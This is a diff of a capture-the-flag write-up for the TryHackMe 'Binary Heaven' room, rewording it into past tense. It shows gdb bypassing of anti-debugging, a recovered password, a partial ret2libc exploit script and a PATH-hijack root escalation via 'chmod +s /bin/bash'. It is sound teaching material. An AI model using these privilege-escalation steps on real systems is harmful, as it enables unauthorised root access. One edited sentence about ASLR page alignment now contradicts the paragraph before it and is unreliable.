@@ -12,7 +12,7 @@ Binary Heaven is a medium room available on [TryHackMe](https://tryhackme.com/ro
 
 # Being worthy
 
-The challenge starts with 2 binary files called `angels_A` and `angels_B`. A first analysis reveals that both are not stripped 64 bit ELF with some basic protections enabled. In particular, `angel_A` has NX and PIE, while `angel_B` has NX and canary set.
+The challenge started with 2 binary files called `angels_A` and `angels_B`. A first analysis revealed that both were not stripped 64 bit ELF with some basic protections enabled. In particular, `angel_A` had NX and PIE, while `angel_B` had NX and canary set.
 
 ```
 ┌──(giu㉿kali)-[~/Downloads/machine/credentials_1614324056485]
@@ -46,11 +46,11 @@ angel_B: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked,
     Stripped:   No
 ```
 
-The most interesting (and unusual) thing is that `angel_B` is a Go compiled binary.
+The most interesting (and unusual) thing, was that `angel_B` was a Go compiled binary.
 
 ## Username (`angel_A`)
 
-Starting from `angel_A`, let’s inspect what it does.
+Starting from `angel_A`, I inspected what it was doing.
 
 ```
 ┌──(giu㉿kali)-[~/Downloads/machine/credentials_1614324056485]
@@ -64,7 +64,7 @@ Say my username >> AAAAAAAAAAA
 That is not my username!
 ```
 
-The binary asks for username and checks if it is correct. `strings` utility seems to not reveal any username or interesting string, so we have to use a disassembler to analyze it.
+The binary asked for username and checked if it was correct. `strings` utility did not reveal any username or interesting string, so I had to continue using a disassembler to analyze it.
 
 ```
 ┌──(giu㉿kali)-[~/Downloads/machine/credentials_1614324056485]
@@ -96,27 +96,27 @@ Correct! That is my name!
 ...
 ```
 
-As we can see, the binary calls `ptrace` and checks if any debugger is attached to the process before asking for user input, interrupting execution if an attached debugger is discovered.
+The binary called `ptrace` and checked if any debugger was attached to the process before asking for user input, interrupting execution if an attached debugger was discovered.
 
 ![image.png](/assets/images/thm-binary-heaven/image.png)
 
-This type of control can be easily bypassed by setting a breakpoint right before `ptrace` call, jumping to the address where username is retrieved.
+This type of control could be easily bypassed by setting a breakpoint right before `ptrace` call, jumping to the address where username was retrieved.
 
 The decompiled section of code responsable of checking the username string is reported below.
 
 ![image.png](/assets/images/thm-binary-heaven/114db3c2-36eb-4494-a069-5456f8b7e4bb.png)
 
-Because username string is built runtime, the only thing we can do is execute step-by-step the `for` loop until it is finished and inspect the registers at each iteration to obtain the correct characters.
+Because username string was built runtime, the only thing I could do was execute step-by-step the `for` loop until it was finished and inspect the registers at each iteration to obtain the correct characters.
 
-As we can see from the assembly code in the image below, the compare instruction is performed on `rda` and `rdx`, so those are the registers we have to deal with. In particular, we are interested in `rdx`, which will contain the username characters.
+The compare instruction was performed on `rda` and `rdx`, so those were the registers I had to deal with. In particular, I was interested in `rdx`, which contained the username characters.
 
 ![image.png](/assets/images/thm-binary-heaven/image%201.png)
 
-The plan is to set a breakpoint on the `cmp edx, eax` instruction and inspect the registers each time the breakpoint is reached. It is crucial that the loop does not break, which happens if the compare instruction fails, so every time that the breakpoint hits we have to force the two registers equals. 
+The plan was to set a breakpoint on the `cmp edx, eax` instruction and inspect the registers each time the breakpoint was reached. It was crucial that the loop did not break, which happened if the compare instruction failed, so every time that the breakpoint hit I had to force the two registers equals. 
 
-To proceed with the described methodology, we have to set 2 breakpoints: 
+To proceed with that methodology, I had to set 2 breakpoints: 
 
-1. The first to interrupt the execution before `ptrace` is called and jump to user input instruction 
+1. The first to interrupt the execution before `ptrace` was called and jump to user input instruction 
 2. The second to inspect `rdx` value for the correct character and avoid performing the compare instruction on not equal registers (which would break the loop and exit the program)
 
 ```
@@ -150,9 +150,9 @@ Breakpoint 3, 0x000055555555521f in main ()
 ...
 ```
 
-In `gdb`, the first breakpoint (`0x0000555555555198`) hits at the instruction before `ptrace` is called, while the second one (`0x000055555555521f`) hits at every compare in the for loop. The `jump` command simply skip the `ptrace` control. 
+In `gdb`, the first breakpoint (`0x0000555555555198`) hit at the instruction before `ptrace` is called, while the second one (`0x000055555555521f`) hit at every compare in the for loop. The `jump` command simply skipped the `ptrace` control. 
 
-As reported below, using `info registers` command before the `cmp` instruction reveals the character value used in the current loop iteration (i.e. the right character to use in the username string to pass the check).
+I used `info registers` command before the `cmp` instruction to reveal the character value used in the current loop iteration (i.e. the right character to use in the username string to pass the check).
 
 ```
 pwndbg> info registers
@@ -186,7 +186,7 @@ pwndbg> set $rax = $rdx
 pwndbg> continue
 ```
 
-Now, we have to continue this process until the loop is finished, always forcing `rax = rdx` before the next breakpoint hits.
+I continued the process until the loop was finished, always forcing `rax = rdx` before the next breakpoint hit.
 
 ```
 pwndbg> info registers
@@ -265,7 +265,7 @@ Correct! That is my name!
 [Inferior 1 (process 63633) exited normally]
 ```
 
- After 8 iterations, we are able to reconstruct the final string.
+After 8 iterations, I was able to reconstruct the final string.
 
 ```
 ┌──(giu㉿kali)-[~/Downloads/machine/credentials_1614324056485]
@@ -280,9 +280,9 @@ Type "help", "copyright", "credits" or "license" for more information.
 kym~humr
 ```
 
-Obviously, this is not the final username string, but the result of the calculations that the program executes on the username string itself. Looking again at the assembly code above, we can see that each character of the user input is xored with `0x04`, and value `0x08` is added to the result. This static operation can also be seen in the fact that when we inserted the letter ‘`A`’ (`0x41` in hex), `rax` always contained value `0x4d`. This means that the operations on the user input chars are hardcoded, and do not change among loop iterations, which makes the reversing process easier. 
+Obviously, that was not the final username string, but the result of the calculations that the program executed on the username string itself. Looking again at the assembly code, I saw that each character of the user input was xored with `0x04`, and value `0x08` was added to the result. That static operation could also be seen in the fact that when I inserted `AAAAAAAAAAAAA` as input (letter ‘`A`’ is `0x41` in hex), `rax` always contained value `0x4d`. This meant that the operations on the user input chars were hardcoded, and did not change among loop iterations, which made the reversing process easier. 
 
-To obtain the real username, we have to reverse the binary process, subtracting `0x08` and xoring with `0x04`.
+To obtain the real username, I had to reverse the binary process, subtracting `0x08` and xoring with `0x04`.
 
 ```
 ┌──(giu㉿kali)-[~/Downloads/machine/credentials_1614324056485]
@@ -305,7 +305,7 @@ Correct! That is my name!
 
 ## Password (`angel_B`)
 
-The binary shows a similar behavior to the previous one.
+The binary showed a similar behavior to the previous one.
 
 ```
 ┌──(giu㉿kali)-[~/Downloads/machine/credentials_1614324056485]
@@ -320,15 +320,15 @@ AAAAAAAAAAA
 You are not worthy of heaven!
 ```
 
-Analyzing the program decompiled code, we can see that the function responsible of checking if the password is correct is `runtime_memequal`. We also discover that the password length is 11.
+Analyzing the program decompiled code, I saw that the function responsible of checking if the password was correct was `runtime_memequal`. I discovered that the password length was 11.
 
 ![image.png](/assets/images/thm-binary-heaven/image%202.png)
 
-So, the assembly code section we are interested in is the following.
+So, the assembly code section I was interested in is the following.
 
 ![image.png](/assets/images/thm-binary-heaven/image%203.png)
 
-As we can see, the `rax` register is loaded with the string `GOg0esGrrr!`, passed as argument to `runtime_memequal`. It is highly probable that this string is the final password itself, because it is directly compared with user input without any transformation. So, let’s give it a try.
+The `rax` register was loaded with the string `GOg0esGrrr!`, passed as argument to `runtime_memequal`. It was highly probable that this string was the final password itself, because it was directly compared with user input without any transformation. So, i gave it a try and it worked.
 
 ```
 ┌──(giu㉿kali)-[~/Downloads/machine/credentials_1614324056485]
@@ -340,7 +340,7 @@ GOg0esGrrr!
 Right password! Now GO ahead and SSH into heaven.
 ```
 
-Now that we have both username and password, we can proceed accessing the target machine via ssh and retrieving the first flag.
+Now that I had both username and password, I could proceed accessing the target machine via ssh and retrieving the first flag.
 
 ```
 guardian:GOg0esGrrr!
@@ -373,7 +373,7 @@ THM{REDACTED}
 
 # Return to the origins
 
-In the home directory of the compromised user, we can find a new binary with SUID. Gaining a shell inside the binary lead to an horizontal privilege escalation to the user `binexgod`.
+In the home directory of the compromised user,I found a new binary with SUID. Gaining a shell inside this binary could lead to an horizontal privilege escalation to the user `binexgod`.
 
 ```
 guardian@heaven:~$ ls -la
@@ -393,7 +393,7 @@ drwxrwxr-x 2 guardian guardian  4096 Mar  4  2021 .nano
 -rw------- 1 guardian guardian   228 May  8  2021 .python_history
 ```
 
-In particular, we are dealing with a 32 bit ELF, compiled with some basic protections such as PIE and NX. I transferred the binary to my local Kali machine to analyze it more easily.
+In particular, I was dealing with a 32 bit ELF, compiled with some basic protections such as PIE and NX. I transferred the binary to my local Kali machine to analyze it more easily.
 
 ```
 ┌──(giu㉿kali)-[~/Downloads/machine]
@@ -421,7 +421,7 @@ pwn_me: ELF 32-bit LSB pie executable, Intel i386, version 1 (SYSV), dynamically
     Stripped:   No
 ```
 
-Once executed, the binary prints an interesting message that seems to reveal the `system` function address.
+Once executed, the binary printed an interesting message that revealed the `system` function address.
 
 ```
 ┌──(giu㉿kali)-[~/Downloads/machine]
@@ -434,7 +434,7 @@ System is at: 0xf7d4e000
 AAAAAAAAAAAAAAAAA
 ```
 
-Executing the binary again shows a different address (because ASLR is enabled) but with the same last 3 hex values of the previous execution. This is coherent with the 32 bit architecture, which handles memory locations in pages and not in byte.
+Executing the binary again showed a different address (because ASLR is enabled) but with the same last 3 hex values of the previous execution. This was coherent with the 32 bit architecture, which handles memory locations in pages and not in byte.
 
 ```
 ┌──(giu㉿kali)-[~/Downloads/machine]
@@ -444,28 +444,28 @@ System is at: 0xf7cec000
 AAAAAA
 ```
 
-With a forced page alignment, last 3 hex values of each address cannot change among different executions, even when ASLR is enabled.
+With a forced page alignment, last 3 hex values of each address could change among different executions, even if ASLR was enabled.
 
-Knowing `system` address, the most obvious attack we can think of a ret2libc. After analyzing the binary assembly code, we can spot an interesting function named `vuln`, invoked by `main`.
+With the `system` address knowledge, the most obvious attack I could think of was a ret2libc. After analyzing the binary assembly code, I spotted an interesting function named `vuln`, invoked by `main`.
 
 ![image.png](/assets/images/thm-binary-heaven/image%204.png)
 
-The `vuln` function simply prints the hint message and retrieve user input with the insecure `gets` function, exploitable for the buffer overflow, which is saved in a variable `s` long `0x20-0x8` bytes.
+The `vuln` function simply printed the hint message and retrieved user input with the insecure `gets` function, which was saved in a variable `s` long `0x20-0x8` bytes.
 
 ![image.png](/assets/images/thm-binary-heaven/image%205.png)
 
-This means that we can overflow the `s` variable and overwrite the return address, hijacking the execution to `system` function and gaining a shell.
+That meant that I could overflow the `s` variable and overwrite the return address, hijacking the execution to `system` function and gaining a shell.
 
-Two things are missing in order to complete this plan:
+Two things were missing in order to complete the plan:
 
 1. Discover the address of `/bin/sh` string to pass to `system` function
 2. Understand how parameters are passed to a function in a x86 (32 bit) binary
 
 ## Calculate `libc` base address
 
-To calculate appropriate `libc` offsets, it is crucial to execute the binary on the target server and note the last 3 hex character of the leaked address.
+To calculate appropriate `libc` offsets, it was crucial to execute the binary on the target server and note the last 3 hex character of the leaked address.
 
-This way it is possible to use an [online libc database](https://libc.rip/) to discover the offset of `/bin/sh` string in reference to `libc` base.
+This way it was possible to use an [online libc database](https://libc.rip/) to discover the offset of `/bin/sh` string in reference to `libc` base.
 
 ```
 guardian@heaven:~$ ./pwn_me 
@@ -473,11 +473,11 @@ Binexgod said he want to make this easy.
 System is at: 0xf7db8950
 ```
 
-As we can see in the image below, the database provides 50 candidates.
+The database provides 50 candidates.
 
 ![image.png](/assets/images/thm-binary-heaven/image%206.png)
 
-To select the appropriate one, let’s inspect the exact `libc` version used on the remote server.
+To select the appropriate one, I inspected the exact `libc` version used on the remote server and chose the appropriate candidate.
 
 ```
 guardian@heaven:~$ /lib32/libc.so.6
@@ -499,7 +499,7 @@ For bug reporting instructions, please see:
 
 ![image.png](/assets/images/thm-binary-heaven/image%207.png)
 
-In alternative, we could have extracted the offsets directly from `libc` file on the target machine.
+In alternative, I could also have extracted the offsets directly from `libc` file on the target machine.
 
 ```
 guardian@heaven:~$ readelf -s /lib32/libc.so.6 | grep system
@@ -511,13 +511,13 @@ guardian@heaven:~$ strings -a -t x /lib32/libc.so.6 | grep "/bin/sh"
  15910b /bin/sh
 ```
 
-After taking note of the offsets, we have to calculate `libc` base address.
+After taking note of the offsets, I calculated `libc` base address.
 
 ```
 libc_base_address = leaked_system_address - system_offset (0x3a950)
 ```
 
-To obtain the `/bin/sh` string address we must simply add its offset to the calculated `libc` base address 
+To obtain the `/bin/sh` string address I simply added its offset to the calculated `libc` base address 
 
 ```
 str_bin_sh_address = libc_base_address + str_bin_sh_offset (0x15910b)
@@ -525,13 +525,13 @@ str_bin_sh_address = libc_base_address + str_bin_sh_offset (0x15910b)
 
 ## Passing command parameter to `system`
 
-Using an [online guide](https://en.wikipedia.org/wiki/Calling_convention#x86_(32-bit)), it is possible to discover that on 32 bit binary the function calling convention states that parameters must be passed on stack.
+Using an [online guide](https://en.wikipedia.org/wiki/Calling_convention#x86_(32-bit)), I discovered that on a 32 bit binary the function calling convention states that parameters must be passed on stack.
 
 ![image.png](/assets/images/thm-binary-heaven/image%208.png)
 
 ## Exploit Building
 
-Once gained every information needed, we can start building the exploit.
+Once gained every information needed, I started building the exploit.
 
 ```
 from pwn import *
@@ -564,7 +564,7 @@ p.sendline(payload)
 p.interactive()
 ```
 
-Executing the exploit lead to a shell as user `binexgod`.
+Executing the exploit made me gain a shell as user `binexgod`.
 
 ```
 guardian@heaven:~$ echo 'never' > /home/guardian/.cache/.pwntools-cache-3.5/update
@@ -587,7 +587,7 @@ $
 
 # Secrets of Heaven
 
-In the `binexgod` user home directory, there is another binary with `root` SUID. Gaining a shell inside it lead to a complete pwn of the machine.
+In the `binexgod` user home directory, there was another binary with `root` SUID. Gaining a shell inside it could lead to a complete pwn of the machine.
 
 ```
 $ ls -la
@@ -622,7 +622,7 @@ $ cp secret_of_heaven /tmp
 $
 ```
 
-The file is a 64 bit ELF.
+The file was a 64 bit ELF.
 
 ```
 ┌──(giu㉿kali)-[~/Downloads/machine]
@@ -648,18 +648,18 @@ vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, i
     Stripped:   No                                                                                                                                           
 ```
 
-Analyzing the assembly code, we can see that `main` simply calls `system` function with the following command argument: `/usr/bin/env echo Get out of heaven lol`
+Analyzing the assembly code, I saw that `main` simply called `system` function with a command argument: `/usr/bin/env echo Get out of heaven lol`
 
 ![image.png](/assets/images/thm-binary-heaven/image%209.png)
 
-The challenge name suggests something related to PATH environment variable, so I thought to gain a privesc through the binary by overwriting `$PATH`. In general, we are able to change the behavior of any command invoked inside a program by simply creating a fake command with the same name and changing `$PATH` variable.
+The challenge name suggested something related to PATH environment variable, so I thought to gain a privesc through the binary by overwriting `$PATH`. In general, it is possible to change the behavior of any command invoked inside a program by simply creating a fake command with the same name and changing `$PATH` variable.
 
-The `system` function executes the command ‘`/usr/bin/env echo Get out of heaven lol`’
+The `system` function executed the command ‘`/usr/bin/env echo Get out of heaven lol`’
 
-- For `env` command, the full path is specified, so our trick will not work because it will bypass the PATH search
-- The only command remained to hijack is `echo`
+- For `env` command, the full path was specified, so the trick would not work because it would bypass the PATH search
+- The only command remained to hijack the execution was `echo`
 
-The plan is to create a fake command that adds SUID to `/bin/bash`, so we can execute it and gain a shell as `root`. The reason this will work is that SUID for `/bin/bash` will be set by our fake command inside `vuln` binary, which has itself a SUID set. Consequently the SUID on `/bin/bash` will be set as user `root`.
+The plan was to create a fake command that adds SUID to `/bin/bash`, so I could execute it and gain a shell as `root`. The reason this would work was that SUID for `/bin/bash` would be set by my fake command inside `vuln` binary, which had itself a SUID set. Consequently the SUID on `/bin/bash` would be set as user `root`.
 
 ```
 $ echo 'chmod +s /bin/bash' > /tmp/echo && chmod +x /tmp/echo && export PATH=/tmp:$PATH
@@ -670,7 +670,7 @@ $ ls -la /bin/bash
 -rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
 ```
 
-At this point, we can simply execute `/bin/bash` with `-p` parameter to not drop privileges.
+At this point, I could simply execute `/bin/bash` with `-p` parameter to not drop privileges and gain a `root` shell.
 
 ```
 $ /bin/bash -p
